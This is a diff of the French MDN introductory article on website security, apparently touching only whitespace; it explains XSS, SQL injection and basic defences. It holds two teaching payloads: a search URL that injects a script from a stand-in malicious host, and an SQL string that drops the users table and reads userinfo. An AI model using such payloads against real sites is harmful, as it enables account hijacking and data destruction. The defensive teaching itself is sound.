@@ -11,7 +11,7 @@ original_slug: Learn/Server-side/Premiers_pas/Website_security
 ---
 {{LearnSidebar}}{{PreviousMenu("Learn/Server-side/First_steps/Web_frameworks", "Learn/Server-side/Premiers_pas")}}
 
-La sécurité d'un site web exige de la vigilance dans tous les aspects de sa conception et de son utilisation. Cet article d'introduction ne fera pas de vous un gourou de la sécurité des sites web, mais il vous aidera à comprendre d'où viennent les menaces et ce que vous pouvez faire pour renforcer votre application web contre les attaques les plus courantes.
+La sécurité d'un site web exige de la vigilance dans tous les aspects de sa conception et de son utilisation. Cet article d'introduction ne fera pas de vous un gourou de la sécurité des sites web, mais il vous aidera à comprendre d'où viennent les menaces et ce que vous pouvez faire pour renforcer votre application web contre les attaques les plus courantes.
 
 <table class="standard-table">
   <tbody>
@@ -34,13 +34,13 @@ La sécurité d'un site web exige de la vigilance dans tous les aspects de sa c
 
 Internet est un endroit dangereux ! Fréquemment, nous entendons parler de sites web devenus indisponibles en raison d'attaques par déni de service, ou affichant des informations modifiées (et souvent préjudiciables) sur leurs pages d'accueil. Dans d'autres cas, très médiatisés, des millions de mots de passe, d'adresses électroniques et de détails sur des cartes de crédit sont divulgués au public, exposant les utilisateurs du site web à la fois à l'embarras personnel et au risque de pertes financières.
 
-L'objectif de la sécurité des sites web est de prévenir ces types d'attaques. Plus formellement, la sécurité des sites web est l'acte de protéger les sites web contre l'accès, l'utilisation, la modification, la destruction ou la perturbation non autorisées.
+L'objectif de la sécurité des sites web est de prévenir ces types d'attaques. Plus formellement, la sécurité des sites web est l'acte de protéger les sites web contre l'accès, l'utilisation, la modification, la destruction ou la perturbation non autorisées.
 
-La sécurité efficace d'un site web nécessite un effort de conception sur l'ensemble du site : dans votre application web, dans la configuration du serveur web, dans vos politiques de création et de renouvellement des mots de passe et dans le code côté-client. Bien que tout cela semble très inquiétant, la bonne nouvelle est que si vous utilisez un framework web côté serveur, il incluera certainement par défaut des mécanismes de défense solides et bien pensés contre un certain nombre des attaques les plus courantes. D'autres attaques peuvent être atténuées grâce à la configuration de votre serveur web, par exemple en activant HTTPS. Enfin, les outils d'analyse de vulnérabilité accessibles au public peuvent vous aider à découvrir d'éventuelles erreurs dans votre conception.
+La sécurité efficace d'un site web nécessite un effort de conception sur l'ensemble du site : dans votre application web, dans la configuration du serveur web, dans vos politiques de création et de renouvellement des mots de passe et dans le code côté-client. Bien que tout cela semble très inquiétant, la bonne nouvelle est que si vous utilisez un framework web côté serveur, il incluera certainement par défaut des mécanismes de défense solides et bien pensés contre un certain nombre des attaques les plus courantes. D'autres attaques peuvent être atténuées grâce à la configuration de votre serveur web, par exemple en activant HTTPS. Enfin, les outils d'analyse de vulnérabilité accessibles au public peuvent vous aider à découvrir d'éventuelles erreurs dans votre conception.
 
 Le reste de cet article détaille les menaces les plus courantes qui pèsent sur les sites web et quelques étapes simples pour protèger votre site.
 
-> **Note :** ceci est un article d'introduction, conçu pour vous aider à réflechir à la sécurité de votre site web. Il n'est en rien exhaustif.
+> **Note :** ceci est un article d'introduction, conçu pour vous aider à réflechir à la sécurité de votre site web. Il n'est en rien exhaustif.
 
 ## Menaces visant la sécurité des sites web
 
@@ -54,7 +54,7 @@ XSS est un terme utilisé pour décrire une classe d'attaque qui permet à l'att
 
 Il y a deux manières principales pour demander au site de retourner un script injecté vers un navigateur web — elles sont désignées en tant que vulnérabilités XSS _réfléchie_ et _persistante_.
 
-- Une vulnérabilité XSS  réfléchie se produit quand le contenu de l'utilisateur transmis au serveur est immédiatement retourné, sans avoir été modifié, pour être affiché dans le navigateur — tout les scripts présents dans le contenu d'origine seront exécutés quand la nouvelle page sera chargée!
+- Une vulnérabilité XSS réfléchie se produit quand le contenu de l'utilisateur transmis au serveur est immédiatement retourné, sans avoir été modifié, pour être affiché dans le navigateur — tout les scripts présents dans le contenu d'origine seront exécutés quand la nouvelle page sera chargée!
   On prendra par exemple une fonction de recherche dans un site où les termes recherchés sont encodés en tant que paramètres dans l'URL, et que ces termes sont affichés en permanence avec les résultats. Un attaquant peut construire un lien de recherche contenant un script malicieux en tant que paramètre (ex: `http://mysite.com?q=beer<script%20src="http://sitedangereux.com/malicieux.js"></script>`) et le transmettre par e-mail à un autre utilisateur. Si l'utilisateur ciblé clique sur ce "lien intéressant", le script sera exécuté quand les résultats de la recherche seront affichés. Comme vu auparavant, cela donne à l'attaquant toute les informations dont il a besoin pour se connecter sur le site avec le compte de la victime — potentiellement faire des achats en tant que cet utilisateur ou accèder à la liste de contacts..
 - Une vulnérabilité XSS _persistante_ sera celle où le script malicieux est stocké sur le site web puis affiché, sans modification, un peu plus tard par les autres utilisateurs et exécuté à leur insu.
   Par exemple, un écran de discussion qui accepte les commentaires contenant du code HTML pur peuvent stocker le script malicieux de l'attaquant. Quand les commentaires sont affichés le script est exécuté et peut ensuite transmettre à l'attaquant les informations nécessaires pour accèder au compte de l'utilisateur. Cette méthode d'attaque est extrêmement courante et efficace, parce que l'attaquant n'a pas besoin d'avoir une relation directe avec les victimes.
@@ -63,7 +63,7 @@ Il y a deux manières principales pour demander au site de retourner un script i
 
 La meilleur défense contre les vulnérabilités XSS est de supprimer ou désactiver toutes les balises qui peuvent potentiellement contenir des instructions pour exécuter du code. Pour HTML cela inclut les tags comme `<script>`, `<object>`, `<embed>`, et `<link>`.
 
-Il est nécessaire de traiter les données saisies par l'utilisateur pour être sûr qu'il ne puisse ni exécuter de scripts ni pertuber le fonctionnement normal du site (ce procédé est appelé *input sanitization* en anglais). De nombreux frameworks proposent par défaut cette vérification sur les entrées des formulaires.
+Il est nécessaire de traiter les données saisies par l'utilisateur pour être sûr qu'il ne puisse ni exécuter de scripts ni pertuber le fonctionnement normal du site (ce procédé est appelé *input sanitization* en anglais). De nombreux frameworks proposent par défaut cette vérification sur les entrées des formulaires.
 
 ### Injection SQL
 
@@ -75,7 +75,7 @@ Cette vulnérabilité est présente quand la saisie de l'utilisateur est transmi
 statement = "SELECT * FROM users WHERE name = '" + userName + "';"
 ```
 
-Si l'utilisateur entre un nom correct cela marchera comme voulu. Cependant un utilisateur malveillant peut changer complètement le sens de cette requête SQL pour obtenir la requête qui suit, simplement en ajoutant le texte, **en gras** ci dessous, en tant que nom, cette requête, modifiée, va créer une requête SQL valide qui va supprimer la table `users` et sélectionner toute les données de la table `userinfo` (révèlant les informations de chaque utilisateur). Tout cela est rendu possible à cause du début du texte injecté  (`'a';`) qui va complèter la requête d'origine (`'` est le symbole pour délimiter une chaine de texte en SQL).
+Si l'utilisateur entre un nom correct cela marchera comme voulu. Cependant un utilisateur malveillant peut changer complètement le sens de cette requête SQL pour obtenir la requête qui suit, simplement en ajoutant le texte, **en gras** ci dessous, en tant que nom, cette requête, modifiée, va créer une requête SQL valide qui va supprimer la table `users` et sélectionner toute les données de la table `userinfo` (révèlant les informations de chaque utilisateur). Tout cela est rendu possible à cause du début du texte injecté (`'a';`) qui va complèter la requête d'origine (`'` est le symbole pour délimiter une chaine de texte en SQL).
 
 ```sql
 SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';
@@ -132,9 +132,9 @@ La majorité des attaques citées précédement réusissent lorsque l'applicatio
 Quelques autres points que vous pouvez mettre en place :
 
 - Utilisez une politique de gestion des mots de passe efficace. Encouragez les mots de passe solides avec leur renouvellement fréquent. Prenez en compte une authentification à deux facteurs sur votre site (l'utilisateur, en plus du mot de passe, devra fournir un autre code d'authentification généralement fourni par un matériel physique, que seul l'utilisateur possède, comme un code envoyé sur le téléphone par SMS).
-- Configurez vos serveurs web pour utiliser [HTTPS](/fr/docs/Glossary/https) et [HTTP Strict Transport Security](/fr/docs/Web/Security/HTTP_strict_transport_security) (HSTS). HTTPS chiffre les données transmises entre le client et le serveur. Cela garantit que les données d'authentification, les cookies, les données transistant avec `POST` et les informations d'en-têtes deviennent moins disponibles pour l'attaquant.
+- Configurez vos serveurs web pour utiliser [HTTPS](/fr/docs/Glossary/https) et [HTTP Strict Transport Security](/fr/docs/Web/Security/HTTP_strict_transport_security) (HSTS). HTTPS chiffre les données transmises entre le client et le serveur. Cela garantit que les données d'authentification, les cookies, les données transistant avec `POST` et les informations d'en-têtes deviennent moins disponibles pour l'attaquant.
 - Tenez vous informé des dernières menaces ([la liste actuelle d'OWASP est ici](/fr/docs/)) et préoccupez vous toujours des vulnerabilités les plus courantes en premier.
-- Utilisez [des outils de recherche de vulnérabilités](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) pour faire automatiquement des recherches de bug sur votre site (votre site pourra également proposer un programme de _buf bounty_ pour déceler des bugs, [comme le fait Mozilla ici](https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/)).
+- Utilisez [des outils de recherche de vulnérabilités](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) pour faire automatiquement des recherches de bug sur votre site (votre site pourra également proposer un programme de _buf bounty_ pour déceler des bugs, [comme le fait Mozilla ici](https://www.mozilla.org/en-US/security/bug-bounty/faq-webapp/)).
 - Ne stockez et n'affichez que les données nécessaires. Par exemple, si votre utilisateur doit stocker des données sensibles comme des informations bancaires, affichez seulement ce qui sera suffisant pour être identifié par l'utilisateur, mais pas suffisament pour être copié par un attaquant et être utilisé sur un autre site. La méthode la plus courante en ce moment est de n'afficher que les quatre derniers chiffres du numéro de carte bancaire.
 
 Les frameworks web peuvent aider à atténuer beaucoup des vulnérabilités les plus courantes.
